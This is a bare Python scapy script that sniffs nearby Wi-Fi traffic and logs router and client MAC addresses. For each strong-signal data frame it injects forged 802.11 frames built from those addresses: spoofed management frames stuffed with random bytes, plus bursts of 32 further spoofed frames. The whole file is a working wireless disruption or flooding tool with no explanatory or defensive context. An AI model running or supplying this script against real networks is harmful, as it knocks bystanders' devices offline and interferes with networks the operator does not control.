from scapy.all import *
import time,random,os

print('set interface to:')
a=input('')
mon=a
def packet_handler(packet):
	if packet.haslayer(Dot11):
		def dd(B,st):
			return st.join(chr(random.randint(0,255)) for _ in range(random.randint(27,B)))
		if packet.type == 2 and packet.subtype in [4,10,8,12] and packet.dBm_AntSignal < -40:
			l0=packet.addr1
			l1=packet.addr2
			l2=packet.addr3
			print(f'<SCAN> ROUTER={packet.addr3} ::: CLIENT={packet.addr2} ::: BDCAST={packet.addr1}')
			#print(repr(packet))
			ph=RadioTap()/Dot11(addr1=[l0,l2],addr2=[l1,l2],addr3=[l2,l0],type=0,subtype=[0,2,4,10])/Raw(dd(B=128,st='\x00'))
			pf=RadioTap()/Dot11(addr1=l1,addr2=l2,addr3=l2,type=[0,1],subtype=8)
			sendp(ph,iface=mon,count=1,verbose=0)
			sendp(pf,iface=mon,count=32,verbose=0)
os.system('clear')
print('<INTERFACE> scanning WIFI Access Points..')
sniff(iface=mon,prn=packet_handler)
